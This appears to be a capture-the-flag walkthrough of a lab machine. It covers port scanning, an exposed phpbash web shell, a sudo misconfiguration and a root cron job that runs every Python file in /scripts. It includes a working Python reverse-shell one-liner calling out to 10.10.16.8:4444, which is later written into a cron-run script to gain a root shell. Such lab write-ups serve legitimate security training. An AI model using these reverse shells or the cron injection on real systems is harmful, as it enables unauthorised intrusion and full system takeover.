1,Recon
port scan
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.25 seconds
```

Page check
![](images/Pasted%20image%2020241206063411.png)
There seems like a `phpbash` in the web-content, so let's enumerate them.

Then i successfully get the `phpbash`
`http://10.10.10.68/dev/phpbash.php`
![](images/Pasted%20image%2020241206063753.png)
And the `/etc/passwd` , I found 2 valid user `arrexel` and `scriptmanager`

By check `sudo -l`
```
Matching Defaults entries for www-data on bashed:  
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User www-data may run the following commands on bashed:  
(scriptmanager : scriptmanager) NOPASSWD: ALL
```
the user `scriptmanager` would be a  user to switch and do anything.

So, firstly, we need to get the reverse shell and then switch to this user
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

Then I would directly come to `/scripts`, and I found the files
`test.py and test.txt`

So I would upload `pspy64` to help us to know what happened in the background
```
/sbin/init noprompt 
2024/12/06 04:02:01 CMD: UID=0    PID=1262   | python test.py 
2024/12/06 04:02:01 CMD: UID=0    PID=1261   | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done 
2024/12/06 04:02:01 CMD: UID=0    PID=1260   | /usr/sbin/CRON -f 
2024/12/06 04:03:01 CMD: UID=0    PID=1265   | python test.py 
2024/12/06 04:03:01 CMD: UID=0    PID=1264   | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done 
2024/12/06 04:03:01 CMD: UID=0    PID=1263   | /usr/sbin/CRON -f
```

That means, crontab would check all the python file and run it with root.

```
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.8\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > .exploit.py
```

So we just add the reverse shell into this directory and wait for it was worked.

Then we successfully get the root shell
```
crontab -l
* * * * * cd /scripts; for f in *.py; do python "$f"; done
```